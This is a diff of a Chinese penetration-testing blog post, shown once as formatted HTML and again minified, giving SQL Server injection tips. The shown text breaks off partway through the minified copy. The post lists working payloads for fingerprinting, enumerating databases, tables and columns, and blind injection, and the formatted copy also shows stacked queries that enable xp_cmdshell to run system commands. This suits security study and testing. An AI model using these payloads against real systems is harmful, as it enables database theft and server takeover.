@@ -1,192 +1,79 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta name="description" content="SQL Server 注入常见的一些注入手法"/>
-  <meta name="author" content="Reber"/>
-  
-    
-      <title>SQL注入 tips(SQL Server) | Reber&#39;s Blog</title>
-    
-  
-  <link rel="stylesheet" href="/css/reset.css"/>
-  
-  <link rel="stylesheet" href="/css/smigle.css"/>
-  
-    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
-  
-    <link rel="stylesheet" href="/css/style.css"/>
-  
-  
-    <script src="/js/jquery-3.6.0.min.js"/></script>
-  
-    <script src="/js/highlight.min.js"/></script>
-  
-    <script src="/js/style.js"/></script>
-  
-  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
-  <meta name="msapplication-TileColor" content="#da532c">
-  <meta name="theme-color" content="#ffffff">
-</head>
-
-  <body>
-    <header>
-  <div id="brand">
-    <a class="icon-link" href="https://wyb0.com/">
-      <img
-        class="icon"
-        src="/img/logo.png"
-      />
-    </a>
-    <div class="text">
-      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
-      <h3>只会一点点编程、只会一点点渗透</h3>
-    </div>
-  </div>
-  <nav>
-    
-      
-        
-        <a href="/"><b>Home</b></a>
-      
-         | 
-        <a href="/posts/"><b>Posts</b></a>
-      
-         | 
-        <a href="/categories/"><b>Categories</b></a>
-      
-         | 
-        <a href="/tags/"><b>Tags</b></a>
-      
-         | 
-        <a href="/about/"><b>About</b></a>
-      
-         | 
-        <a href="/friends/"><b>Friends</b></a>
-      
-    
-  </nav>
-  <hr />
-</header>
-
-    <div id="content">
-      
-  <main>
-    <article>
-      <h1>SQL注入 tips(SQL Server)</h1>
-      
-<div class="post-meta">
-    <time>2018-09-04</time>
-    
-    [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/SQL%E6%B3%A8%E5%85%A5">SQL注入</a>)
-</div>
-
-      <div><h3 id="0x00-基础信息探测">0x00 基础信息探测</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">@@</span><span style="color:#66d9ef">VERSION</span>,<span style="color:#f92672">@@</span>SERVERNAME,<span style="color:#f92672">@@</span>SERVICENAME;
-</span></span><span style="display:flex;"><span><span style="color:#75715e">--Microsoft SQL Server 2008 (RTM) - 10.0.1600.22 (X64) 
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">--WIN-2008
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">--MSSQLSERVER
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">USER</span>,<span style="color:#66d9ef">CURRENT_USER</span>,<span style="color:#66d9ef">SESSION_USER</span>,<span style="color:#66d9ef">SYSTEM_USER</span>;
-</span></span><span style="display:flex;"><span><span style="color:#75715e">--dbo
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">--dbo
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">--dbo
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">--sa
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span>USER_NAME(),HOST_NAME(),HOST_ID(),SUSER_NAME();
-</span></span><span style="display:flex;"><span><span style="color:#75715e">--dbo
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">--wyb
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">--46530
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">--sa
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span>USER_ID(),USER_SID();
-</span></span><span style="display:flex;"><span><span style="color:#75715e">--1
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">--&lt;01&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span>ORIGINAL_LOGIN();
-</span></span><span style="display:flex;"><span><span style="color:#75715e">--sa
-</span></span></span></code></pre></div><h3 id="0x01-union-query--error-based-注入">0x01 UNION query &amp; error-based 注入</h3>
-<ul>
-<li>判断存在注入</li>
-</ul>
-<pre tabindex="0"><code>and 1=1/and 1=2
-</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> msg <span style="color:#66d9ef">where</span> id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">and</span> <span style="color:#ae81ff">11</span><span style="color:#f92672">=</span>(<span style="color:#66d9ef">select</span> <span style="color:#66d9ef">case</span> <span style="color:#66d9ef">when</span>(<span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>) <span style="color:#66d9ef">then</span> <span style="color:#ae81ff">11</span> <span style="color:#66d9ef">else</span> <span style="color:#ae81ff">2</span> <span style="color:#66d9ef">end</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> msg <span style="color:#66d9ef">where</span> id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">and</span> <span style="color:#ae81ff">11</span><span style="color:#f92672">=</span>(<span style="color:#66d9ef">select</span> <span style="color:#66d9ef">case</span> <span style="color:#66d9ef">when</span>(<span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>) <span style="color:#66d9ef">then</span> <span style="color:#ae81ff">11</span> <span style="color:#66d9ef">else</span> <span style="color:#ae81ff">2</span> <span style="color:#66d9ef">end</span>);
-</span></span></code></pre></div><ul>
-<li>判断是否为sa权限</li>
-</ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> name <span style="color:#66d9ef">from</span> msg <span style="color:#66d9ef">where</span> id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">and</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#66d9ef">convert</span>(int,(<span style="color:#66d9ef">select</span> is_srvrolemember(<span style="color:#e6db74">&#39;sysadmin&#39;</span>)));
-</span></span></code></pre></div><p><img src="/img/post/20180904-105516.png" alt="55"></p>
-<ul>
-<li>得到所有数据库名字
-<img src="/img/post/20180904-110306.png" alt="75"></li>
-</ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#75715e">--得到数据库名，前6个是系统自带的数据库，所以从第7个开始，dbid依次增加即可得到所有数据库
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">and</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">&lt;&gt;</span>(<span style="color:#66d9ef">select</span> name <span style="color:#66d9ef">from</span> master.dbo.sysdatabases <span style="color:#66d9ef">where</span> dbid<span style="color:#f92672">=</span><span style="color:#ae81ff">7</span>);
-</span></span><span style="display:flex;"><span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">and</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">&lt;&gt;</span>(<span style="color:#66d9ef">select</span> name <span style="color:#66d9ef">from</span> master.dbo.sysdatabases <span style="color:#66d9ef">where</span> dbid<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">--通过 not in 依次得到数据库名
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">and</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">&lt;&gt;</span>(<span style="color:#66d9ef">select</span> top <span style="color:#ae81ff">1</span> name <span style="color:#66d9ef">from</span> master.dbo.sysdatabases <span style="color:#66d9ef">where</span> dbid<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">6</span> <span style="color:#66d9ef">and</span> name <span style="color:#66d9ef">not</span> <span style="color:#66d9ef">in</span> (<span style="color:#66d9ef">select</span> top <span style="color:#ae81ff">1</span> name <span style="color:#66d9ef">from</span> master.dbo.sysdatabases <span style="color:#66d9ef">where</span> dbid<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">6</span>))
-</span></span><span style="display:flex;"><span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">and</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">&lt;&gt;</span>(<span style="color:#66d9ef">select</span> top <span style="color:#ae81ff">1</span> name <span style="color:#66d9ef">from</span> master.dbo.sysdatabases <span style="color:#66d9ef">where</span> dbid<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">6</span> <span style="color:#66d9ef">and</span> name <span style="color:#66d9ef">not</span> <span style="color:#66d9ef">in</span> (<span style="color:#66d9ef">select</span> top <span style="color:#ae81ff">2</span> name <span style="color:#66d9ef">from</span> master.dbo.sysdatabases <span style="color:#66d9ef">where</span> dbid<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">6</span>))
-</span></span></code></pre></div><p><img src="/img/post/20180904-151240.png" alt="75"></p>
-<ul>
-<li>得到数据库test的所有表名（用户创建的表xtype的值是U）
-<img src="/img/post/20180904-111912.png" alt="70"></li>
-</ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#75715e">--得到数据库test的第一张表
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>id<span style="color:#f92672">=-</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">union</span> <span style="color:#66d9ef">select</span> top <span style="color:#ae81ff">1</span> id,name <span style="color:#66d9ef">from</span> test.dbo.sysobjects <span style="color:#66d9ef">where</span> xtype<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;U&#39;</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">--得到数据库test的第二张表方法一
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>id<span style="color:#f92672">=-</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">union</span> <span style="color:#66d9ef">select</span> top <span style="color:#ae81ff">1</span> id,name <span style="color:#66d9ef">from</span> test.dbo.sysobjects <span style="color:#66d9ef">where</span> xtype<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;U&#39;</span> <span style="color:#66d9ef">and</span> name <span style="color:#66d9ef">not</span> <span style="color:#66d9ef">in</span> (<span style="color:#e6db74">&#39;article&#39;</span>);
-</span></span><span style="display:flex;"><span><span style="color:#75715e">--得到数据库test的第二张表方法二
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>id<span style="color:#f92672">=-</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">union</span> <span style="color:#66d9ef">select</span> top <span style="color:#ae81ff">1</span> id,name <span style="color:#66d9ef">from</span> test.dbo.sysobjects <span style="color:#66d9ef">where</span> xtype<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;U&#39;</span> <span style="color:#66d9ef">and</span> name <span style="color:#66d9ef">not</span> <span style="color:#66d9ef">in</span> (<span style="color:#66d9ef">select</span> top <span style="color:#ae81ff">1</span> name <span style="color:#66d9ef">from</span> test.dbo.sysobjects <span style="color:#66d9ef">where</span> xtype<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;U&#39;</span>);
-</span></span></code></pre></div><p><img src="/img/post/20180904-151551.png" alt="80"></p>
-<ul>
-<li>
-<p>得到数据库test的表article的所有列名</p>
-<ul>
-<li>
-<p>可以分两步：先得到article的表id，然后得到列名
-<img src="/img/post/20180904-112859.png" alt="60">
-<img src="/img/post/20180904-112938.png" alt="75"></p>
-</li>
-<li>
-<p><f>也可直接一条命令直接得到列信息</f></p>
-</li>
-</ul>
-<pre tabindex="0"><code>select id,name from syscolumns where id=(select id from sysobjects where name=&#39;msg&#39;);
-</code></pre></li>
-<li>
-<p>得到数据库test的表article的数据
-<img src="/img/post/20180904-113720.png" alt="75"></p>
-</li>
-</ul>
-<h3 id="0x02-boolean-based-blind-注入">0x02 boolean-based blind 注入</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">and</span> <span style="color:#66d9ef">substring</span>(db_name(),<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>)<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#75715e">--
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">and</span> <span style="color:#66d9ef">substring</span>(db_name(),<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>)<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;b&#39;</span> <span style="color:#75715e">--
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#75715e">-- 转换为数字
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">and</span> unicode(<span style="color:#66d9ef">substring</span>((<span style="color:#66d9ef">select</span> db_name()),<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>))<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">88</span> <span style="color:#75715e">--
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">and</span> ascii(<span style="color:#66d9ef">substring</span>((<span style="color:#66d9ef">select</span> db_name()),<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>))<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">88</span> <span style="color:#75715e">--
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#75715e">-- 转换为16进制
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">and</span> (<span style="color:#66d9ef">select</span> master.dbo.fn_varbintohexstr(<span style="color:#66d9ef">CONVERT</span>(varbinary(<span style="color:#ae81ff">30</span>),(<span style="color:#66d9ef">substring</span>(db_name(),<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>)))) <span style="color:#66d9ef">from</span> master..sysdatabases <span style="color:#66d9ef">where</span> dbid<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>) <span style="color:#66d9ef">not</span> <span style="color:#66d9ef">in</span> (<span style="color:#e6db74">&#39;0x7400&#39;</span>)
-</span></span></code></pre></div><h3 id="0x03-stacked-注入">0x03 Stacked 注入</h3>
-<ul>
-<li>执行系统命令</li>
-</ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#判断xp_cmdshell是否被删除</span>
-</span></span><span style="display:flex;"><span>?id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> and 1<span style="color:#f92672">=(</span><span style="color:#66d9ef">select</span> count<span style="color:#f92672">(</span>*<span style="color:#f92672">)</span> from master.dbo.sysobjects where xtype <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;x&#39;</span> and name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;xp_cmdshell&#39;</span><span style="color:#f92672">)</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#开启xp_cmdshell</span>
-</span></span><span style="display:flex;"><span>?id<span style="color:#f92672">=</span>1;exec sp_configure <span style="color:#e6db74">&#39;show advanced options&#39;</span>,1;reconfigure;exec sp_configure <span style="color:#e6db74">&#39;xp_cmdshell&#39;</span>,1;reconfigure;--
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#使用xp_cmdshell执行命令</span>
-</span></span><span style="display:flex;"><span>exec master..xp_cmdshell <span style="color:#e6db74">&#39;whoami&#39;</span>;
-</span></span></code></pre></div><ul>
-<li>文件操作</li>
-</ul>
-<pre tabindex="0"><code>#列目录、文件
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="SQL Server 注入常见的一些注入手法"><meta name=author content="Reber"><title>SQL注入 tips(SQL Server) | Reber's Blog</title>
+<link rel=stylesheet href=/css/reset.css><link rel=stylesheet href=/css/smigle.css><link rel=stylesheet href=/css/monokai-sublime.min.css><link rel=stylesheet href=/css/style.css><script src=/js/jquery-3.6.0.min.js></script><script src=/js/highlight.min.js></script><script src=/js/style.js></script><link rel=icon type=image/img sizes=16x16 href=/img/logo.png><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"></head><body><header><div id=brand><a class=icon-link href=https://wyb0.com/><img class=icon src=/img/logo.png></a><div class=text><a href=https://wyb0.com/><h1>Reber's Blog</h1></a><h3>会一点点编程、会一点点渗透</h3></div></div><nav><a href=/><b>Home</b></a>
+|
+<a href=/posts/><b>Posts</b></a>
+|
+<a href=/categories/><b>Categories</b></a>
+|
+<a href=/tags/><b>Tags</b></a>
+|
+<a href=/about/><b>About</b></a>
+|
+<a href=/friends/><b>Friends</b></a></nav><hr></header><div id=content><main><article><h1>SQL注入 tips(SQL Server)</h1><div class=post-meta><time>2018-09-04</time>
+[<a href=/categories/Pentest>Pentest</a>](<a href=/tags/SQL%E6%B3%A8%E5%85%A5>SQL注入</a>)</div><div><h3 id=0x00-基础信息探测>0x00 基础信息探测</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#f92672>@@</span><span style=color:#66d9ef>VERSION</span>,<span style=color:#f92672>@@</span>SERVERNAME,<span style=color:#f92672>@@</span>SERVICENAME;
+</span></span><span style=display:flex><span><span style=color:#75715e>--Microsoft SQL Server 2008 (RTM) - 10.0.1600.22 (X64) 
+</span></span></span><span style=display:flex><span><span style=color:#75715e>--WIN-2008
+</span></span></span><span style=display:flex><span><span style=color:#75715e>--MSSQLSERVER
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>USER</span>,<span style=color:#66d9ef>CURRENT_USER</span>,<span style=color:#66d9ef>SESSION_USER</span>,<span style=color:#66d9ef>SYSTEM_USER</span>;
+</span></span><span style=display:flex><span><span style=color:#75715e>--dbo
+</span></span></span><span style=display:flex><span><span style=color:#75715e>--dbo
+</span></span></span><span style=display:flex><span><span style=color:#75715e>--dbo
+</span></span></span><span style=display:flex><span><span style=color:#75715e>--sa
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>USER_NAME(),HOST_NAME(),HOST_ID(),SUSER_NAME();
+</span></span><span style=display:flex><span><span style=color:#75715e>--dbo
+</span></span></span><span style=display:flex><span><span style=color:#75715e>--wyb
+</span></span></span><span style=display:flex><span><span style=color:#75715e>--46530
+</span></span></span><span style=display:flex><span><span style=color:#75715e>--sa
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>USER_ID(),USER_SID();
+</span></span><span style=display:flex><span><span style=color:#75715e>--1
+</span></span></span><span style=display:flex><span><span style=color:#75715e>--&lt;01&gt;
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>ORIGINAL_LOGIN();
+</span></span><span style=display:flex><span><span style=color:#75715e>--sa
+</span></span></span></code></pre></div><h3 id=0x01-union-query--error-based-注入>0x01 UNION query & error-based 注入</h3><ul><li>判断存在注入</li></ul><pre tabindex=0><code>and 1=1/and 1=2
+</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#66d9ef>select</span> <span style=color:#f92672>*</span> <span style=color:#66d9ef>from</span> msg <span style=color:#66d9ef>where</span> id<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> <span style=color:#66d9ef>and</span> <span style=color:#ae81ff>11</span><span style=color:#f92672>=</span>(<span style=color:#66d9ef>select</span> <span style=color:#66d9ef>case</span> <span style=color:#66d9ef>when</span>(<span style=color:#ae81ff>1</span><span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>) <span style=color:#66d9ef>then</span> <span style=color:#ae81ff>11</span> <span style=color:#66d9ef>else</span> <span style=color:#ae81ff>2</span> <span style=color:#66d9ef>end</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>select</span> <span style=color:#f92672>*</span> <span style=color:#66d9ef>from</span> msg <span style=color:#66d9ef>where</span> id<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> <span style=color:#66d9ef>and</span> <span style=color:#ae81ff>11</span><span style=color:#f92672>=</span>(<span style=color:#66d9ef>select</span> <span style=color:#66d9ef>case</span> <span style=color:#66d9ef>when</span>(<span style=color:#ae81ff>1</span><span style=color:#f92672>=</span><span style=color:#ae81ff>2</span>) <span style=color:#66d9ef>then</span> <span style=color:#ae81ff>11</span> <span style=color:#66d9ef>else</span> <span style=color:#ae81ff>2</span> <span style=color:#66d9ef>end</span>);
+</span></span></code></pre></div><ul><li>判断是否为sa权限</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#66d9ef>select</span> name <span style=color:#66d9ef>from</span> msg <span style=color:#66d9ef>where</span> id<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> <span style=color:#66d9ef>and</span> <span style=color:#ae81ff>1</span><span style=color:#f92672>=</span><span style=color:#66d9ef>convert</span>(int,(<span style=color:#66d9ef>select</span> is_srvrolemember(<span style=color:#e6db74>&#39;sysadmin&#39;</span>)));
+</span></span></code></pre></div><p><img src=/img/post/20180904-105516.png alt=55></p><ul><li>得到所有数据库名字
+<img src=/img/post/20180904-110306.png alt=75></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#75715e>--得到数据库名，前6个是系统自带的数据库，所以从第7个开始，dbid依次增加即可得到所有数据库
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>id<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> <span style=color:#66d9ef>and</span> <span style=color:#ae81ff>0</span><span style=color:#f92672>&lt;&gt;</span>(<span style=color:#66d9ef>select</span> name <span style=color:#66d9ef>from</span> master.dbo.sysdatabases <span style=color:#66d9ef>where</span> dbid<span style=color:#f92672>=</span><span style=color:#ae81ff>7</span>);
+</span></span><span style=display:flex><span>id<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> <span style=color:#66d9ef>and</span> <span style=color:#ae81ff>0</span><span style=color:#f92672>&lt;&gt;</span>(<span style=color:#66d9ef>select</span> name <span style=color:#66d9ef>from</span> master.dbo.sysdatabases <span style=color:#66d9ef>where</span> dbid<span style=color:#f92672>=</span><span style=color:#ae81ff>8</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>--通过 not in 依次得到数据库名
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>id<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> <span style=color:#66d9ef>and</span> <span style=color:#ae81ff>0</span><span style=color:#f92672>&lt;&gt;</span>(<span style=color:#66d9ef>select</span> top <span style=color:#ae81ff>1</span> name <span style=color:#66d9ef>from</span> master.dbo.sysdatabases <span style=color:#66d9ef>where</span> dbid<span style=color:#f92672>&gt;</span><span style=color:#ae81ff>6</span> <span style=color:#66d9ef>and</span> name <span style=color:#66d9ef>not</span> <span style=color:#66d9ef>in</span> (<span style=color:#66d9ef>select</span> top <span style=color:#ae81ff>1</span> name <span style=color:#66d9ef>from</span> master.dbo.sysdatabases <span style=color:#66d9ef>where</span> dbid<span style=color:#f92672>&gt;</span><span style=color:#ae81ff>6</span>))
+</span></span><span style=display:flex><span>id<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> <span style=color:#66d9ef>and</span> <span style=color:#ae81ff>0</span><span style=color:#f92672>&lt;&gt;</span>(<span style=color:#66d9ef>select</span> top <span style=color:#ae81ff>1</span> name <span style=color:#66d9ef>from</span> master.dbo.sysdatabases <span style=color:#66d9ef>where</span> dbid<span style=color:#f92672>&gt;</span><span style=color:#ae81ff>6</span> <span style=color:#66d9ef>and</span> name <span style=color:#66d9ef>not</span> <span style=color:#66d9ef>in</span> (<span style=color:#66d9ef>select</span> top <span style=color:#ae81ff>2</span> name <span style=color:#66d9ef>from</span> master.dbo.sysdatabases <span style=color:#66d9ef>where</span> dbid<span style=color:#f92672>&gt;</span><span style=color:#ae81ff>6</span>))
+</span></span></code></pre></div><p><img src=/img/post/20180904-151240.png alt=75></p><ul><li>得到数据库test的所有表名（用户创建的表xtype的值是U）
+<img src=/img/post/20180904-111912.png alt=70></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#75715e>--得到数据库test的第一张表
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>id<span style=color:#f92672>=-</span><span style=color:#ae81ff>1</span> <span style=color:#66d9ef>union</span> <span style=color:#66d9ef>select</span> top <span style=color:#ae81ff>1</span> id,name <span style=color:#66d9ef>from</span> test.dbo.sysobjects <span style=color:#66d9ef>where</span> xtype<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;U&#39;</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>--得到数据库test的第二张表方法一
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>id<span style=color:#f92672>=-</span><span style=color:#ae81ff>1</span> <span style=color:#66d9ef>union</span> <span style=color:#66d9ef>select</span> top <span style=color:#ae81ff>1</span> id,name <span style=color:#66d9ef>from</span> test.dbo.sysobjects <span style=color:#66d9ef>where</span> xtype<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;U&#39;</span> <span style=color:#66d9ef>and</span> name <span style=color:#66d9ef>not</span> <span style=color:#66d9ef>in</span> (<span style=color:#e6db74>&#39;article&#39;</span>);
+</span></span><span style=display:flex><span><span style=color:#75715e>--得到数据库test的第二张表方法二
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>id<span style=color:#f92672>=-</span><span style=color:#ae81ff>1</span> <span style=color:#66d9ef>union</span> <span style=color:#66d9ef>select</span> top <span style=color:#ae81ff>1</span> id,name <span style=color:#66d9ef>from</span> test.dbo.sysobjects <span style=color:#66d9ef>where</span> xtype<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;U&#39;</span> <span style=color:#66d9ef>and</span> name <span style=color:#66d9ef>not</span> <span style=color:#66d9ef>in</span> (<span style=color:#66d9ef>select</span> top <span style=color:#ae81ff>1</span> name <span style=color:#66d9ef>from</span> test.dbo.sysobjects <span style=color:#66d9ef>where</span> xtype<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;U&#39;</span>);
+</span></span></code></pre></div><p><img src=/img/post/20180904-151551.png alt=80></p><ul><li><p>得到数据库test的表article的所有列名</p><ul><li><p>可以分两步：先得到article的表id，然后得到列名
+<img src=/img/post/20180904-112859.png alt=60>
+<img src=/img/post/20180904-112938.png alt=75></p></li><li><p><f>也可直接一条命令直接得到列信息</f></p></li></ul><pre tabindex=0><code>select id,name from syscolumns where id=(select id from sysobjects where name=&#39;msg&#39;);
+</code></pre></li><li><p>得到数据库test的表article的数据
